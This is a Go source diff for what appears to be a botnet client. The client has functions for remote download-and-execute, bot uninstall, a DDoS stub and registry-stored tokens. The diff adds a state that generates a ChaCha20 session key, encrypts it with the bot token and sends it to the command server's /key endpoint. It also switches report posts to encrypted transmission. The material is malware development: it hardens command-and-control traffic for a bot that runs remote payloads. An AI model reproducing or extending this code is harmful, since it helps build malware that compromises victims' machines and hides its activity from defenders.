@@ -34,7 +34,7 @@ func do_uninstall_bot(pkg *ServerReply, host string) {
 	url := build_url(host, "/report", botcore.use_ssl)
 	timestamp := generate_utc_timestamp_string()
 	sign := create_sign(g_token, g_guid, timestamp)
-	do_head_post(url, byt, map[string]string{
+	do_head_encrypt_post(url, byt, map[string]string{
 		"X-Guid": g_guid,
 		"X-Time": timestamp,
 		"X-Sign": base64_enc(sign),
@@ -84,7 +84,7 @@ func do_remote_download_execute(pkg *ServerReply, host string) bool {
 	timestamp := generate_utc_timestamp_string()
 	sign := create_sign(g_token, g_guid, timestamp)
 	// Send HTTP POST request
-	do_head_post(url, byt, map[string]string{
+	do_head_encrypt_post(url, byt, map[string]string{
 		"X-Guid": g_guid,
 		"X-Time": timestamp,
 		"X-Sign": base64_enc(sign),
@@ -95,6 +95,34 @@ func do_remote_download_execute(pkg *ServerReply, host string) bool {
 
 func do_ddos_attack(pkg *ServerReply, host string) bool {
 	return false
+}
+
+func send_key_request(host string) BotState {
+	url := build_url(host, "/key", botcore.use_ssl)
+	timestamp := generate_utc_timestamp_string()
+	// Generate signature
+	sign := create_sign(g_token, g_guid, timestamp)
+	// Generate 32 bytes key
+	key, err := generate_key()
+	if err != nil {
+		return StateShareKey
+	}
+	// Send encrypted key to server
+	bytToken, _ := base64_dec(g_token)
+	enc_key := enc_chacha20(bytToken, key)
+
+	reply := do_head_post(url, enc_key, map[string]string{
+		"X-Guid": g_guid,
+		"X-Time": timestamp,
+		"X-Sign": base64_enc(sign),
+	}, botcore.use_ssl)
+	// Check package legality
+	if reply == nil || !check_package_legality(reply) || reply.Status == 0 {
+		return StateShareKey
+	}
+	g_key = base64_enc(key)
+
+	return StateCommandPoll
 }
 
 func send_recover_request(host string) BotState {
@@ -112,10 +140,10 @@ func send_recover_request(host string) BotState {
 	g_token = reply.Args["Token"].(string)
 	// Save to registry, if failed, ignore it just start to send poll
 	if !reg_create_or_update_value(registry.CURRENT_USER, g_regpath, "Token", g_token, true) {
-		return StateCommandPoll
+		return StateShareKey
 	}
 
-	return StateCommandPoll
+	return StateShareKey
 }
 
 func send_poll_request(host string) BotState {
@@ -188,8 +216,10 @@ func auth_bot_poll(state BotState, host string) BotState {
 			next_state = StateRecoverPoll
 		} else {
 			g_token = val.(string)
-			next_state = StateCommandPoll
+			next_state = StateShareKey
 		}
+	case StateShareKey:
+		next_state = send_key_request(host)
 	case StateRecoverPoll:
 		// Send recovery poll
 		next_state = send_recover_request(host)
